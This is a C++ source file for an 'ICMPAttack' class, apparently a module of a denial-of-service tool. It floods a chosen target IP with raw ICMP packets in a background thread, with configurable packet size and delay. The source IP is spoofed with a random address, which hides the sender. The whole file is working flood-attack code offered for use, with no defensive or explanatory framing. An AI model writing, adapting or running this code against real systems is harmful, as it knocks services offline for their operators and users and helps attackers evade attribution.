#include "attack/ICMPAttack.h"
#include "network/PacketBuilder.h"
#include "network/RawSocket.h"
#include "util/Logger.h"
#include "util/Randomizer.h"
#include <thread>
#include <chrono>

ICMPAttack::ICMPAttack(const std::string& targetIP, int packetSize, int delayMs)
    : targetIP_(targetIP), packetSize_(packetSize), delayMs_(delayMs) {}

ICMPAttack::~ICMPAttack() {
    stop();
}

void ICMPAttack::start() {
    if (running_) return;
    
    running_ = true;
    Logger::getInstance().log(LogLevel::INFO, "Starting ICMP attack on " + targetIP_);
    
    std::thread([this]() {
        try {
            RawSocket socket(IPPROTO_ICMP);
            
            // 生成随机源IP
            std::string sourceIP = Randomizer::getInstance().randomIP();
            uint16_t id = Randomizer::getInstance().randomInt(1, 65535);
            uint16_t seq = 1;
            
            while (running_) {
                auto packet = PacketBuilder::buildICMPPacket(
                    sourceIP, targetIP_, id, seq, std::string(packetSize_, 'A'));
                
                if (!socket.sendPacket(packet)) {
                    Logger::getInstance().log(LogLevel::ERROR, "Failed to send ICMP packet");
                }
                
                seq++;
                std::this_thread::sleep_for(std::chrono::milliseconds(delayMs_));
            }
        } catch (const std::exception& e) {
            Logger::getInstance().log(LogLevel::ERROR, "ICMP attack error: " + std::string(e.what()));
            running_ = false;
        }
    }).detach();
}

void ICMPAttack::stop() {
    running_ = false;
    Logger::getInstance().log(LogLevel::INFO, "Stopped ICMP attack");
}

std::string ICMPAttack::getDescription() const {
    return "ICMP flood attack targeting " + targetIP_ + " with " + 
           std::to_string(packetSize_) + " byte packets";
}